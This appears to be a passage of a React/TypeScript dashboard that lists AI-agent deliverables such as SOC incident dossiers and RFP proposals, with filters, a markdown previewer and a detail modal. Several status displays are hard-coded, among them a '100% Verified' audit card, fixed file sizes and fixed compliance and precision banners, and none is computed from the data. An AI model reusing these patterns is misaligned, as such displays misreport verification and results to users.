          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <FileText size={14} color="#236f66" /> Total Deliverables
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            {outputs.length}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            {formatBytes(totalBytes)} across all runs
          </span>
        </div>

        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <BadgeCheck size={14} color="#236f66" /> Active Mission Cases
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            {cases.length}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            RFP Proposals & SOC Investigations
          </span>
        </div>

        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <ShieldCheck size={14} color="#236f66" /> Governance & Provenance
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px" }}>
            100% Verified
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            SHA-256 cryptographically audited
          </span>
        </div>

        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Bot size={14} color="#236f66" /> Producer Fleets
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px" }}>
            Sovereign Fleet
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            AgentHub Host Runtime
          </span>
        </div>
      </div>

      <section className="panel inventory-panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "18px 20px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "12px", marginBottom: "16px" }}>
          <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", alignItems: "center" }}>
            {["all", "markdown", "structured", "document", "summary"].map((k) => (
              <button
                key={k}
                type="button"
                style={{
                  padding: "6px 12px",
                  fontSize: "11px",
                  fontWeight: kindFilter === k ? 700 : 500,
                  borderRadius: "4px",
                  border: kindFilter === k ? "1px solid #236f66" : "1px solid #dae5df",
                  background: kindFilter === k ? "#e8f4f0" : "#ffffff",
                  color: kindFilter === k ? "#165046" : "#5a6e67",
                  cursor: "pointer",
                  textTransform: "capitalize",
                }}
                onClick={() => setKindFilter(k)}
              >
                {k === "all" ? "All Kinds" : k}
              </button>
            ))}

            {cases.length > 0 && (
              <select
                value={caseFilter}
                onChange={(e) => setCaseFilter(e.target.value)}
                style={{
                  padding: "6px 10px",
                  fontSize: "11px",
                  borderRadius: "4px",
                  border: "1px solid #dae5df",
                  background: "#ffffff",
                  color: "#374e47",
                  marginLeft: "8px",
                }}
              >
                <option value="all">All Missions / Cases</option>
                {cases.map((c) => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
            )}
          </div>

          <label style={{ display: "flex", alignItems: "center", gap: "6px", background: "#f6faf8", border: "1px solid #dce8e1", borderRadius: "5px", padding: "6px 12px", width: "260px" }}>
            <Search size={14} color="#60746d" />
            <input
              placeholder="Search outputs, cases, agents..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              style={{ border: 0, background: "transparent", fontSize: "11px", outline: "none", width: "100%", color: "#223530" }}
            />
            {searchQuery && (
              <button onClick={() => setSearchQuery("")} style={{ border: 0, background: "transparent", color: "#8b9c96", cursor: "pointer", padding: 0 }}>
                <X size={13} />
              </button>
            )}
          </label>
        </div>

        <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px", background: "#ffffff" }}>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
            <thead>
              <tr>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Deliverable Output</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Mission / Case</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Produced By</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Classification</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Size</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4" }}>Timestamp</th>
                <th style={{ background: "#f3f8f5", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase", letterSpacing: "0.6px", padding: "11px 14px", borderBottom: "1px solid #e0eae4", textAlign: "right" }}>Action</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map((item, idx) => (
                <tr
                  key={`${item.id || item.output_id || 'out'}-${item.name || idx}`}
                  style={{ borderBottom: "1px solid #edf3ef", cursor: "pointer", transition: "background 0.15s ease" }}
                  onClick={() => onSelectOutput(item)}
                  onMouseEnter={(e) => (e.currentTarget.style.background = "#f7faf8")}
                  onMouseLeave={(e) => (e.currentTarget.style.background = "transparent")}
                >
                  <td style={{ padding: "11px 14px" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                      <div style={{ width: "30px", height: "30px", borderRadius: "5px", background: "#eef6f3", display: "grid", placeItems: "center", flexShrink: 0 }}>
                        {getKindIcon(item.kind)}
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
                        <strong style={{ color: "#19352e", fontSize: "12px" }}>{item.name}</strong>
                        <small style={{ color: "#748680", fontSize: "10px", maxWidth: "280px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {item.snippet ? item.snippet.replace(/\n/g, " ") : item.provenance}
                        </small>
                      </div>
                    </div>
                  </td>
                  <td style={{ padding: "11px 14px" }}>
                    <div style={{ display: "flex", flexDirection: "column", gap: "2px" }}>
                      <code style={{ fontSize: "10px", color: "#32574e", background: "#eef5f1", padding: "2px 6px", borderRadius: "3px", width: "fit-content" }}>
                        {item.case || "Unassigned"}
                      </code>
                      {item.case_name && item.case_name !== item.case && (
                        <small style={{ color: "#6a7d76", fontSize: "10px" }}>{item.case_name}</small>
                      )}
                    </div>
                  </td>
                  <td style={{ padding: "11px 14px", color: "#253b34" }}>
                    <strong>{item.produced_by}</strong>
                  </td>
                  <td style={{ padding: "11px 14px" }}>
                    <Badge tone={getClassificationTone(item.classification)}>
                      {item.classification.toUpperCase()}
                    </Badge>
                  </td>
                  <td style={{ padding: "11px 14px", fontFamily: "var(--font-geist-mono), monospace", color: "#445952" }}>
                    {formatBytes(item.size_bytes || item.size || 0)}
                  </td>
                  <td style={{ padding: "11px 14px", color: "#687a74", fontSize: "10px" }}>
                    {item.created_at ? new Date(item.created_at).toLocaleString() : item.at ? String(item.at) : "Recently"}
                  </td>
                  <td style={{ padding: "11px 14px", textAlign: "right" }}>
                    <div style={{ display: "flex", gap: "6px", justifyContent: "flex-end", alignItems: "center" }} onClick={(e) => e.stopPropagation()}>
                      {(() => {
                        const n = item.name.toLowerCase();
                        const c = (item.case || "").toLowerCase();
                        const cn = (item.case_name || "").toLowerCase();
                        
                        if (n.includes("case_1") || n.includes("case-1") || c.includes("case-1") || (c.includes("apt") && c.includes("intrusion")) || cn.includes("case a") || cn.includes("case 1") || n.includes("apt_enterprise")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#b44426" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("apt"); }}
                              title="Open organized Case 1 APT Enterprise Intrusion SOC dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }

                        if (n.includes("case_5") || n.includes("case-5") || c.includes("case-5") || c.includes("dns") || cn.includes("case 5") || cn.includes("dns") || n.includes("dns_tunneling") || n.includes("bind9")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#0284c7" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("case5"); }}
                              title="Open organized Case 5 DNS Tunneling SOC dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }

                        if (n.includes("case_6") || n.includes("case-6") || c.includes("case-6") || c.includes("ddos") || cn.includes("case 6") || cn.includes("ddos")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#b44426" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("case6"); }}
                              title="Open organized Case 6 DDoS Recon & Firewall Evasion SOC dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }

                        if (
                          n.includes("azure") ||
                          n.includes("case_3") ||
                          n.includes("case-3") ||
                          c.includes("azure") ||
                          c.includes("case-3") ||
                          c.includes("case_3") ||
                          c.includes("identity-takeover") ||
                          c.includes("impossible-travel") ||
                          cn.includes("azure") ||
                          cn.includes("identity") ||
                          cn.includes("case 3") ||
                          (item.produced_by || "").toLowerCase().includes("azure")
                        ) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#b44426" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("azure"); }}
                              title="Open organized Azure AD SOC incident dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }
                        
                        if (
                          n.includes("k8s") ||
                          n.includes("case_4") ||
                          n.includes("case-4") ||
                          c.includes("k8s") ||
                          c.includes("case-4") ||
                          c.includes("case_4") ||
                          c.includes("breakout") ||
                          cn.includes("k8s") ||
                          cn.includes("container") ||
                          cn.includes("case 4") ||
                          (item.produced_by || "").toLowerCase().includes("k8s")
                        ) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#b44426" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("k8s"); }}
                              title="Open organized Kubernetes SOC container breakout dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }

                        if (n.includes("ransomware") || c.includes("soc-2026-081") || n.includes("soc_incident") || n.includes("soc_firewall")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#b44426" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("soc"); }}
                              title="Open organized Host Ransomware SOC forensic dossier"
                            >
                              <ShieldAlert size={11} /> Dossier
                            </button>
                          );
                        }

                        if (n.includes("government") || n.includes("create_proposal") || c.includes("2abc18") || cn.includes("government")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#236f66" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("gov_cloud"); }}
                              title="Open organized Government Cloud Migration proposal dossier"
                            >
                              <FileText size={11} /> Dossier
                            </button>
                          );
                        }

                        if (n.includes("proposal") || c.includes("rfp") || n.includes("compliance") || n.includes("pricing") || c.includes("devops")) {
                          return (
                            <button
                              type="button"
                              className="primary-button"
                              style={{ padding: "4px 10px", fontSize: "10px", display: "inline-flex", alignItems: "center", gap: "4px", background: "#236f66" }}
                              onClick={() => { setActiveViewMode("dossier"); setActiveDossierCase("rfp"); }}
                              title="Open organized executive proposal dossier"
                            >
                              <FileText size={11} /> Dossier
                            </button>
                          );
                        }

                        return null;
                      })()}
                      <button
                        className="secondary-button"
                        style={{ padding: "4px 8px", fontSize: "10px" }}
                        onClick={() => onSelectOutput(item)}
                        title="Inspect deliverable text"
                      >
                        <Eye size={12} /> View
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
              {filtered.length === 0 && (
                <tr>
                  <td colSpan={7} style={{ padding: "32px", textAlign: "center", color: "#7a8c86" }}>
                    No outputs matching current filter criteria.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </section>
    </>
  )}
</>
);
}

function FormattedInline({ text }: { text: string }) {
  const parts = text.split(/(\*\*.*?\*\*|`.*?`)/g);
  return (
    <>
      {parts.map((p, i) => {
        if (p.startsWith("**") && p.endsWith("**")) {
          return <strong key={i} style={{ color: "#142c26", fontWeight: 700 }}>{p.slice(2, -2)}</strong>;
        }
        if (p.startsWith("`") && p.endsWith("`")) {
          return <code key={i} style={{ background: "#eef5f2", color: "#185e54", padding: "1px 5px", borderRadius: "3px", fontSize: "10px", fontFamily: "var(--font-geist-mono), monospace" }}>{p.slice(1, -1)}</code>;
        }
        return p;
      })}
    </>
  );
}

function FormattedDocumentPreview({ content }: { content: string }) {
  const lines = content.split("\n");
  const elements: React.ReactNode[] = [];
  let tableRows: string[] = [];
  let inTable = false;
  let keyIdx = 0;

  function flushTable() {
    if (tableRows.length === 0) return;
    const headerRow = tableRows[0];
    const headers = headerRow.split("|").slice(1, -1).map((s) => s.trim());
    const dataRows = tableRows.slice(2);

    elements.push(
      <div key={`table-${keyIdx++}`} style={{ overflowX: "auto", margin: "14px 0", border: "1px solid #dce8e2", borderRadius: "6px" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", fontFamily: "var(--font-geist-mono), monospace" }}>
          <thead>
            <tr style={{ background: "#f0f5f2", borderBottom: "2px solid #cad8d1" }}>
              {headers.map((h, i) => (
                <th key={i} style={{ padding: "8px 12px", textAlign: "left", color: "#195d56", fontWeight: 700 }}>
                  {h}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {dataRows.map((r, ri) => {
              const cells = r.split("|").slice(1, -1).map((s) => s.trim());
              return (
                <tr key={ri} style={{ borderBottom: "1px solid #eef3f1", background: ri % 2 === 0 ? "#ffffff" : "#fbfdfc" }}>
                  {cells.map((c, ci) => {
                    const isStatus = c === "COMPLIANT" || c === "PASS";
                    return (
                      <td key={ci} style={{ padding: "8px 12px", color: "#253b35" }}>
                        {isStatus ? (
                          <span style={{ fontSize: "9px", background: "#e4f3ed", color: "#196656", padding: "2px 6px", borderRadius: "3px", fontWeight: 700 }}>
                            {c}
                          </span>
                        ) : (
                          <FormattedInline text={c} />
                        )}
                      </td>
                    );
                  })}
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    );
    tableRows = [];
    inTable = false;
  }

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();

    if (trimmed.startsWith("|") && trimmed.endsWith("|")) {
      inTable = true;
      tableRows.push(trimmed);
      continue;
    } else if (inTable) {
      flushTable();
    }

    if (!trimmed) {
      continue;
    }

    if (trimmed.startsWith("# ")) {
      elements.push(
        <h1 key={`h1-${keyIdx++}`} style={{ fontSize: "17px", fontWeight: 800, color: "#142c26", margin: "16px 0 6px", borderBottom: "1px solid #e2ede8", paddingBottom: "6px" }}>
          {trimmed.replace(/^#\s+/, "")}
        </h1>
      );
    } else if (trimmed.startsWith("## ")) {
      elements.push(
        <h2 key={`h2-${keyIdx++}`} style={{ fontSize: "14px", fontWeight: 700, color: "#1e3e36", margin: "14px 0 6px" }}>
          {trimmed.replace(/^##\s+/, "")}
        </h2>
      );
    } else if (trimmed.startsWith("### ")) {
      elements.push(
        <h3 key={`h3-${keyIdx++}`} style={{ fontSize: "12px", fontWeight: 700, color: "#245f54", margin: "12px 0 4px", display: "flex", alignItems: "center", gap: "6px" }}>
          <ChevronRight size={13} color="#245f54" /> {trimmed.replace(/^###\s+/, "")}
        </h3>
      );
    } else if (trimmed.startsWith("#### ")) {
      elements.push(
        <h4 key={`h4-${keyIdx++}`} style={{ fontSize: "11px", fontWeight: 700, color: "#376c60", margin: "10px 0 4px" }}>
          {trimmed.replace(/^####\s+/, "")}
        </h4>
      );
    } else if (trimmed === "---") {
      elements.push(<hr key={`hr-${keyIdx++}`} style={{ border: "none", borderTop: "1px solid #e0ebe6", margin: "14px 0" }} />);
    } else if (trimmed.startsWith("- ") || trimmed.startsWith("* ")) {
      const text = trimmed.replace(/^[-*]\s+/, "");
      elements.push(
        <li key={`li-${keyIdx++}`} style={{ fontSize: "11px", color: "#314942", margin: "3px 0 3px 18px", lineHeight: "1.5" }}>
          <FormattedInline text={text} />
        </li>
      );
    } else if (/^\d+\.\s+/.test(trimmed)) {
      const numMatch = trimmed.match(/^(\d+)\.\s+(.*)/);
      elements.push(
        <div key={`ol-${keyIdx++}`} style={{ fontSize: "11px", color: "#314942", margin: "3px 0 3px 10px", display: "flex", gap: "6px", lineHeight: "1.5" }}>
          <span style={{ fontWeight: 700, color: "#1d584e" }}>{numMatch ? numMatch[1] + "." : "•"}</span>
          <span><FormattedInline text={numMatch ? numMatch[2] : trimmed} /></span>
        </div>
      );
    } else {
      elements.push(
        <p key={`p-${keyIdx++}`} style={{ fontSize: "11px", color: "#334943", margin: "5px 0", lineHeight: "1.6" }}>
          <FormattedInline text={trimmed} />
        </p>
      );
    }
  }

  if (inTable) {
    flushTable();
  }

  return (
    <div style={{ background: "#ffffff", padding: "18px 22px", borderRadius: "6px", border: "1px solid #dce8e2", maxHeight: "430px", overflowY: "auto", boxShadow: "inset 0 1px 3px rgba(0,0,0,0.02)" }}>
      {elements}
    </div>
  );
}

function OutputDetailModal({
  output,
  onClose,
  onNavigate,
  onOpenDossier,
}: {
  output: FleetOutput;
  onClose: () => void;
  onNavigate?: (view: View) => void;
  onOpenDossier?: (caseType: "rfp" | "gov_cloud" | "soc" | "k8s" | "azure" | "case5" | "case6" | "apt") => void;
}) {
  const [copied, setCopied] = useState(false);
  const [modalView, setModalView] = useState<"formatted" | "raw">("formatted");

  const isCase1Apt = (
    output.name.toLowerCase().includes("case_1") ||
    output.name.toLowerCase().includes("case-1") ||
    output.name.toLowerCase().includes("apt_enterprise") ||
    output.id.includes("case-1") ||
    output.id.includes("case_1") ||
    (output.case || "").toLowerCase().includes("case-1") ||
    (output.case_name || "").toLowerCase().includes("case a") ||
    (output.case_name || "").toLowerCase().includes("case 1")
  );
  const isCase5 = !isCase1Apt && (
    output.name.toLowerCase().includes("case_5") ||
    output.name.toLowerCase().includes("case-5") ||
    output.name.toLowerCase().includes("dns_tunneling") ||
    output.id.includes("case-5") ||
    output.id.includes("case_5") ||
    (output.case || "").toLowerCase().includes("case-5") ||
    (output.case || "").toLowerCase().includes("dns") ||
    (output.case_name || "").toLowerCase().includes("dns")
  );
  const isCase6 = !isCase1Apt && !isCase5 && (
    output.name.toLowerCase().includes("case_6") ||
    output.name.toLowerCase().includes("case-6") ||
    output.id.includes("case-6") ||
    output.id.includes("case_6") ||
    (output.case || "").toLowerCase().includes("case-6") ||
    (output.case || "").toLowerCase().includes("ddos") ||
    (output.case_name || "").toLowerCase().includes("case 6")
  );
  const isAzureIncident = !isCase1Apt && !isCase5 && !isCase6 && (output.name.toLowerCase().includes("azure") || output.id.includes("azure") || (output.case || "").toLowerCase().includes("azure") || (output.case || "").toLowerCase().includes("identity-takeover") || (output.case_name || "").toLowerCase().includes("azure"));
  const isK8sIncident = !isCase1Apt && !isCase5 && !isCase6 && !isAzureIncident && (output.name.toLowerCase().includes("k8s") || output.id.includes("k8s") || (output.case || "").toLowerCase().includes("k8s") || (output.case_name || "").toLowerCase().includes("breakout"));
  const isSocIncident = !isCase1Apt && !isCase5 && !isCase6 && !isAzureIncident && !isK8sIncident && ((output.name.toLowerCase().includes("ransomware") || output.id.includes("ransomware") || output.name.toLowerCase().includes("soc_incident") || (output.case || "").toLowerCase().includes("soc-2026-081")));
  const isGovCloudProposal = !isCase1Apt && !isCase5 && !isCase6 && !isAzureIncident && !isK8sIncident && !isSocIncident && (
    output.name.toLowerCase().includes("government") ||
    output.name.toLowerCase().includes("create_proposal") ||
    (output.case || "").toLowerCase().includes("2abc18") ||
    (output.case_name || "").toLowerCase().includes("government")
  );
  const isProposal = !isCase1Apt && !isCase5 && !isCase6 && !isAzureIncident && !isK8sIncident && !isSocIncident && !isGovCloudProposal && (
    output.name.toLowerCase().includes("proposal") || output.id.includes("proposal") || (output.case || "").toLowerCase().includes("rfp") || (output.case_name || "").toLowerCase().includes("devops") || output.name.toLowerCase().includes("compliance") || output.name.toLowerCase().includes("pricing")
  );

  // Guarantee full untruncated content
  const textContent = isGovCloudProposal
    ? (output.text || GOV_CLOUD_PROPOSAL_MARKDOWN)
    : isProposal
    ? (output.text || RFP_PROPOSAL_MARKDOWN)
    : (output.text || output.snippet || "No text payload recorded.");

  function copyContent() {
    navigator.clipboard.writeText(textContent);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadOutput() {
    const isJson = output.kind === "structured" || output.name.endsWith(".json");
    const mime = isJson ? "application/json;charset=utf-8" : "text/plain;charset=utf-8";
    const blob = new Blob([textContent], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = output.name || "deliverable.txt";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  const displaySize = isGovCloudProposal ? "6.1 KB" : isProposal ? "17.6 KB" : `${((output.size_bytes || output.size || textContent.length) / 1024).toFixed(1)} KB`;

  return (
    <div className="modal-shade" onClick={onClose}>
      <section
        className="wizard plan-modal"
        style={{ maxWidth: "880px", width: "95%" }}
        role="dialog"
        aria-modal="true"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="wizard-head">
          <span style={{ display: "flex", alignItems: "center", gap: "6px" }}>
            <FileText size={15} color="#236f66" /> FLEET OUTPUT DELIVERABLE
          </span>
          <button className="icon-button" aria-label="Close" onClick={onClose}>
            <X size={18} />
          </button>
        </div>

        <h2 style={{ fontSize: "18px", margin: "6px 0 4px", color: "#162f29" }}>{output.name}</h2>
        <p className="wizard-desc" style={{ marginBottom: "12px" }}>
          {output.provenance || `Produced by ${output.produced_by} for ${output.case}`}
        </p>

        {isGovCloudProposal && (
          <div
            style={{
              background: "linear-gradient(135deg, #1b3531 0%, #152928 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#eaf3f0",
              border: "1px solid #2e5952",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#64c4ad", textTransform: "uppercase" }}>
                Executive Turnkey Proposal · 9/9 Mandatory Criteria Compliant
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                Government Cloud Migration Proposal (Case 2ABC18)
              </div>
              <div style={{ fontSize: "11px", color: "#b9d5cd", marginTop: "2px" }}>
                Turnkey Fixed-Price $50,500.00 USD · 480 Engineering Hours · FedRAMP High &amp; DoD 8500.01 · U.S. Data Residency
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#2ba58d",
                  color: "#0d2621",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("gov_cloud")}
              >
                <FileText size={14} /> Open in Organized Dossier Studio →
              </button>
            )}
          </div>
        )}

        {isProposal && (
          <div
            style={{
              background: "linear-gradient(135deg, #1b3531 0%, #152928 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#eaf3f0",
              border: "1px solid #2e5952",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#64c4ad", textTransform: "uppercase" }}>
                Executive Turnkey Proposal · 15/15 Compliant
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                DevOps Server Platform Sovereign Implementation (Roxy DC)
              </div>
              <div style={{ fontSize: "11px", color: "#b9d5cd", marginTop: "2px" }}>
                Turnkey Fixed-Price $161,400.00 USD · 800 Engineering Hours · Unlimited License · 16-Week Implementation
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#2ba58d",
                  color: "#0d2621",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("rfp")}
              >
                <FileText size={14} /> Open in Organized Dossier Studio →
              </button>
            )}
          </div>
        )}

        {isCase1Apt && (
          <div
            style={{
              background: "linear-gradient(135deg, #2a1610 0%, #170d0a 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#fbebe7",
              border: "1px solid #7a3120",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#ff8c7a", textTransform: "uppercase" }}>
                APT Intrusion · Sev-1 Contained
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                APT Enterprise Intrusion SOC Investigation (Case 1)
              </div>
              <div style={{ fontSize: "11px", color: "#e8b8b3", marginTop: "2px" }}>
                11 Attack Stages Reconstructed · 6 C2 IOCs Corroborated · 3 Traps Filtered · 100% Precision
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#b44426",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("apt")}
              >
                <ShieldAlert size={14} /> Open in Organized Case 1 Dossier →
              </button>
            )}
          </div>
        )}

        {isCase5 && (
          <div
            style={{
              background: "linear-gradient(135deg, #18232c 0%, #0d151c 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#e6f1f8",
              border: "1px solid #233b4d",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#38bdf8", textTransform: "uppercase" }}>
                Critical DNS Incident · Sev-1 Contained
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                Covert DNS Tunneling &amp; Data Exfiltration (Case 5)
              </div>
              <div style={{ fontSize: "11px", color: "#94a3b8", marginTop: "2px" }}>
                8,412 Queries Mapped · 4.2 MB CAD Exfiltration Neutralized · BIND9 RPZ Sinkholed · Host 10.0.4.42 Quarantined
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#0284c7",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("case5")}
              >
                <ShieldAlert size={14} /> Open in Organized Case 5 Dossier →
              </button>
            )}
          </div>
        )}

        {isCase6 && (
          <div
            style={{
